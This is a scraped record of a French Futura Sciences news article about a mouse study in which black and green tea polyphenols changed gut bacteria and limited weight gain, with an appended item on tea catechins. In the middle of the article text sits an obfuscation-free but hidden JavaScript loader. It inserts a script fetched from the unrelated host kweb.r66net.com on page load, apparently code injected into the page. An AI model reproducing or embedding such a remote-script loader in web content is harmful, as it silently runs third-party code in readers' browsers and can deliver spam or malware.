{"title": "Régime : le thé noir aiderait à perdre du poids", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "09/10/2017", "content": "Une étude chez la souris montre que les polyphénols du thé vert et du thé noir favorisent la perte de poids en modifiant la composition de la flore intestinale. Une découverte inédite pour le thé noir, qui est le thé le plus consommé en France. Ce qu'il faut retenir Le thé noir contient de grosses molécules de polyphénols qui ne sont pas absorbées par l'intestin grêle. Ces polyphénols favoriseraient la présence de bactéries qui préviennent la prise de poids. Le thé noir augmente aussi la présence des acides gras à chaîne courte dans l'intestin, des molécules qui jouent un rôle dans le métabolisme. Le  thé vert  est souvent cité pour ses atouts minceur. Et le thé noir ? Thé vert et thé noir ne possèdent pas les mêmes  molécules  ; ils diffèrent notamment au niveau de leurs polyphénols. Ceux du thé noir sont trop grands pour être absorbés par l'intestin grêle. Ils pourraient agir sur la flore intestinale et donc sur le poids, car celle-ci est impliquée dans l'obésité. Voir aussi : Thé vert, thé noir, quelle différence ? Dans cette étude de l'université de Californie (Los Angeles), des souris ont suivi quatre régimes alimentaires différents : un régime faible en graisses et riche en sucre, un régime riche en graisse et en sucre ou un régime riche en graisse et en sucre complémenté en extraits de thé vert ou noir (0,25 %). Les résultats paraissent dans la revue  European Journal of Nutrition . Au bout de quatre semaines, le poids des souris qui ont eu du  thé  vert ou noir a rejoint celui des souris qui avaient un régime pauvre en graisses ; pourtant celles qui prenaient du thé suivaient un régime riche en graisses et en sucre. Les chercheurs ont aussi analysé la flore intestinale des souris. Chez celles qui avaient eu des extraits de thé, il y avait moins de bactéries associées à l'obésité et plus de bactéries associées avec un poids normal : les régimes qui contenaient des extraits de thé conduisaient à une diminution des bactéries  Firmicutes  et une augmentation de  Bacteroidetes .  La flore intestinale joue un rôle important dans la santé et les maladies liées à l’obésité comme le diabète. © chombosan, Fotolia                               Le thé noir modifie la composition de la flore intestinale Cependant, seules les souris qui ont eu du thé noir avaient une augmentation de bactéries appelées  Pseudobutyrivibrio . Le thé noir augmentait aussi la formation d' acides gras  à chaîne courte (AGCC) dans l'intestin.  Le saviez-vous ? Les AGCC comme les acides acétique, propionique et butyrique sont produits par la fermentation de bactéries intestinales à partir de fibres alimentaires et de glucides complexes. Les AGCC servent de source d’énergie pour l’épithélium du côlon et des tissus périphériques. Les AGCC sont aussi absorbés par le sang et peuvent aller au foie où ils jouent un rôle dans le métabolisme énergétique.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les bactéries  Pseudobutyrivibrio  possèdent une activité enzymatique qui contribue à la formation des AGCC. La fermentation des polysaccharides en AGCC est l'un des mécanismes qui peuvent expliquer comment des changements du microbiote intestinal peuvent avoir un impact sur la  prise de poids . Les chercheurs ont donc montré que le thé noir pourrait favoriser la perte de poids en modifiant la composition de la flore intestinale. Ces nouveaux résultats démontrent que les  polyphénols  du thé noir, qui sont trop grands pour être absorbés par l'intestin grêle, stimulent la croissance des bactéries intestinales et la formation d'AGCC. Voir aussi : Une bactérie intestinale contre l’obésité et le diabète Dans un  communiqué , Susanne Henning, auteure de ces travaux, a expliqué :  « nos nouveaux résultats suggèrent que le thé noir, grâce à un mécanisme spécifique à travers le microbiome intestinal, peut également contribuer à une bonne santé et à une perte de poids chez les humains ».  Elle ajoute que  « les résultats suggèrent que les thés verts et noirs sont des prébiotiques, des substances qui induisent la croissance des bons microorganismes qui contribuent au bien-être d'une personne ». Pour en savoir plus Le thé contre les problèmes de poids Article de ADIT Japon publié le 13 août 2004 Des chercheurs du Laboratoire de recherche sur les aliments santé de la Kao Corporation viennent de montrer que les catéchines apportées par la consommation de thé permettaient de réduire significativement la  masse  corporelle, l' IMC , la masse de graisse corporelle ainsi que la région de graisse abdominale sur des sujets consommant régulièrement ces molécules pendant 12 semaines. Les chercheurs ont réussi à montrer chez la souris que les catéchines de thé activaient la beta-oydation ( oxydation  mitochondriale des acides gras) et l'expression d' ARNm  codant pour les  enzymes  de la beta-oydation dans le  foie .  Ces résultats confirment que l' ingestion  de catéchines provoque une accélération de l'oxydation des  lipides  et une augmentation de la dépense énergétique due à cette oxydation.  Une régulation positive du  métabolisme  lipidique dans le foie par les catéchines pourrait ainsi contribuer à supprimer l'accumulation de graisses dans le corps. Interview : le microbiote intestinal, allié indispensable du système immunitaire                       Le microbiote intestinal regroupe l’ensemble des microbes présents dans notre intestin. Il permet un bon fonctionnement ainsi qu’une certaine protection du côlon. Gerard Eberl, responsable de l’unité Micro-environnement & Immunité à l’Institut Pasteur, nous en dit plus au cours de cette interview.                                       ", "theme": "sante"}